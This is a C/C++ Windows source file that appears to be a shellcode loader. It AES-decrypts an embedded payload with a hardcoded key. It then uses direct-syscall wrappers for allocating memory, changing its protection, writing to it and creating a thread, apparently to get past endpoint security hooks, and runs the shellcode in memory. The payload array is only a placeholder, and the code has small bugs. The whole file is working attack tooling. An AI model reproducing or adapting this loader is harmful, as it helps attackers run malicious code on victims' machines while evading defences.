#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <process.h>
#include <psapi.h>
#include "syscalls_mem.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")


#define NtCurrentProcess() ((HANDLE)0xFFFFFFFF)


#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)





int getthatdecrypted_sea(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}




int getthatpayloadinjected(HANDLE hProc, unsigned char* stream, unsigned int stream_len) {


	LPVOID baseAddress = NULL;

	size_t allocSize = stream_len;

	LPVOID rb;

	auto status = CRACK_NtAVM(hProc, &baseAddress, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to Allocate memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("[*] Successfully allocated RW memory at 0x%p of size %lld\n", baseAddress, allocSize);
	getchar();


	size_t shellcodeSize = sizeof(stream) / sizeof(stream[0]);
	printf("[*] Shellcode length: %lld\n", shellcodeSize);
	getchar();

	DWORD oldProtect1;
	status = CRACK_NtPVM(hProc, &baseAddress, (PSIZE_T)&stream_len, PAGE_EXECUTE_READWRITE, &oldProtect1);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to change permission to RWX on memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("[*] Successfully changed memory protections to RWX\n");
	getchar();



	status = CRACK_NtWVM(hProc, baseAddress, stream, stream_len, NULL);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to write at at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("Shell code written at Allocated Virtual Memory \n");
	getchar();

	DWORD oldProtect;
	status = CRACK_NtPVM(hProc, &baseAddress, (PSIZE_T)&stream_len, PAGE_EXECUTE_READ, &oldProtect);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to change permission to RX on memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("[*] Successfully changed memory protections to RX\n");
	getchar();
	HANDLE threadhandle;
	CRACK_NtCTE(&threadhandle, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)baseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	if (threadhandle == NULL) {
		CloseHandle(hProc);
		printf("ThreadHandle failed :( exiting...\n");
		return -2;
	}
	else {
		printf("successfully injected via NtCreateThreadEx :)\n");
	}

	printf("Thread created using NtCreateThreadEx \n");
	WaitForSingleObject(threadhandle, INFINITE);





}


int main(void) {

	
	HANDLE hProc = (HANDLE)-1;

	unsigned char stream[] = { 0x78, 0xb4, 0x5c, 0x6c  };   //Encrypted shellcode goes here
	unsigned char key[] = { 0xdb, 0x1a, 0xd3, 0xa0, 0x5c, 0x15, 0xa6, 0x1d, 0x6c, 0xa9, 0xd6, 0x93, 0xc6, 0xe3, 0x76, 0x94 };

	unsigned int stream_len = sizeof(stream);
	unsigned int key_len = sizeof(key);



	getthatdecrypted_sea((char*)stream, stream_len, (char*)key, key_len);
	getthatpayloadinjected(hProc, stream, stream_len);
	CloseHandle(hProc);

	
}
